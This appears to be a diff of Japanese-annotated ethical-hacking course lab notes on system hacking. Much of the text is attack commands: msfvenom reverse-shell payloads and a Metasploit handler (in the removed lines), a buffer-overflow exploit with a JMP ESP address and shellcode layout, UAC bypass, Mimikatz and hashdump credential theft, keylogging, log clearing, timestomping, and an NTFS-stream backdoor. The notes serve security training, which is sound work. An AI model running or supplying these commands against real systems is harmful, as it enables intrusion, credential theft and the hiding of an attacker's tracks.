@@ -385,32 +385,7 @@
 - [Vulners](https://vulners.com)
 - [CIRCL CVE Search](https://cve.circl.lu)
 #### Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session
-- `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe`
-- ```sh
-  mkdir /var/www/html/share
-  chmod -R 755 /var/www/html/share
-  chown -R www-data:www-data /var/www/html/share
-  cp /home/attacker/Desktop/Test.exe /var/www/html/share
-  
-  service apache2 start
-  ```
-- ```sh
-  msfconsole
-  msf6 > use exploit/multi/handler
-  msf6 exploit(multi/handle) > set payload windows/meterpreter/reverse_tcp
-  msf6 exploit(multi/handle) > set LHOST 10.10.1.13
-  msf6 exploit(multi/handle) > set LPORT 444
-  msf6 exploit(multi/handle) > exploit
-  # can take meterpreter session if target download and execute Test.exe
-  meterpreter > sysinfo
-  meterpreter > upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
-  meterpreter > shell
-
-  C:\Users\Admin\Downloads>powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks
-  C:\Users\Admin\Downloads>exit
-
-  meterpreter > run vnc
-  ```
+- `C:\Users\Admin\Downloads>powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks`
 #### Task 5: Gain Access to a Remote System using Armitage
 - `service postgresql start`
 - `armitage`
@@ -450,5 +425,57 @@
   essfunc.dllが「Rebase」「SafeSEH」「ASLR」が無効になっていたので、このモジュール内の「JMP ESP」命令を使用したい
 - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`で「JMP ESP」のアセンブリが「FFE4」と判明  
   デバッガで`!mona find -s "\xff\xe4" -m essfunc.dll`実行、「JMP ESP」のアドレスは「0x625011af」と判明
-- `msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b "\x00"`でシェルコード作成
-  [WIn_shellcode.py)](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIn_shellcode.py)の
+- `msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`でシェルコード作成  
+  [WIn_shellcode.py)](https://github.com/FishyStix12/WHPython_v1.1/blob/main/WIn_shellcode.py)のコード`shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 8 + overflow`になるように実行  
+  （"\xaf\x11\x50\x62"は「JMP ESP」アドレスのリトルエンディアン、"\x90"はNOP命令、overflow変数はmsfvenomでシェルコード）　　
+  「nc - lnvp 4444」でリッスン・無事リバースシェルを取得できた
+  
+### Lab 2: Perform Privilege Escalation to Gain Higher Privileges
+#### Task 1: Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities
+- `beRoot`
+- `Seatbelt`
+- meterpreter
+  - `use exploit/windows/local/bypassuac_fodhelper`
+  - `getsystem -t 1`
+  - `run post/windows/gather/smart_hashdump`
+  - `clearev`
+#### Task 2: Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter
+- meterpreter
+  - `timestomp Secret.txt -m "02/11/2018 08:10:03"`
+  - `keyscan_start`
+- cmd
+  - `sc queryex type=service state=all`
+  - `netsh firewall show state`
+  - `netsh firewall show config`
+  - `wmic /node:"" product get name,version,vendor`
+  - `wmic cpu get`
+  - `wmic useraccount get name,sid`
+#### Task 3: Escalate Privileges by Exploiting Vulnerability in pkexec
+- CVE-2021-4034
+#### Task 4: Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys
+- meterpreter
+  - `use exploit/windows/local/bypassuac_fodhelper`
+  - `getsystem -t 1`
+  - `use post/windows/manage/sticky_keys`
+#### Task 5: Escalate Privileges to Gather Hashdump using Mimikatz
+- `load kiwi`
+- `lsa_dump_sam`
+- `lsa_dump_secrets`
+- ` password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password`
+
+### Lab 3: Maintain Remote Access and Hide Malicious Activities
+#### Task 1: User System Monitoring and Surveillance using Power Spy
+- `Power Spy`
+#### Task 2: User System Monitoring and Surveillance using Spytech SpyAgent
+- `Spytech SpyAgent `
+- [ACTIVTrak](https://activtrak.com)
+- [Veriato Cerebral](https://www.veriato.com)
+- [NetVizor](https://www.netvizor.net)
+- [SoftActivity Monitor](https://www.softactivity.com)
+#### Task 3: Hide Files using NTFS Streams
+- ```
+  c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+  mklink backdoor.exe readme.txt:calc.exe
+   backdoor.exe
+  ```
+#### Task 4: Hide Data using White Space Steganography
